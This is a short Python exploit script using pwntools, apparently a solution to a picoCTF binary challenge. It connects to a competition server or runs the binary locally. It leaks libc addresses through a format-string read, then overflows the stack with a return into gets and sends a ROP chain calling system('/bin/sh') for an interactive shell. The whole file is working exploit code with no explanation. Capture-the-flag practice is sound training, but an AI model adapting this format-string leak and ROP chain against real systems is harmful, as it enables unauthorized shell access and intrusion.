#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
#context.log_level = 'debug'

BIN = './G'
# https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.symbols


if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 52063)
else:
    r = process(BIN, env={"LD_PRELOAD": "./libc-2.27.so"})

s = ""
for i in range(20, 30):
    s += f'%{i}$p-'

print(s)
r.sendline(s)
owo = r.recvline().split(b'-')
print(owo)

ret_off = 0x78
libc = int(owo[3], 16) - 0x21b10 - 0xe7

puts = libc + 0x80aa0
gets = libc + 0x80190
binsh = libc + 0x1b3e1a
system = libc + 0x4f550
pop_rdi_ret = 0x400793

print(f"""
libc = {hex(libc)}
""")

payload = b''.ljust(ret_off, b'A') + p64(gets)
r.sendline(payload)

p2 = b'Q'*0x10 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
sleep(0.1)
r.sendline(p2)
r.interactive()
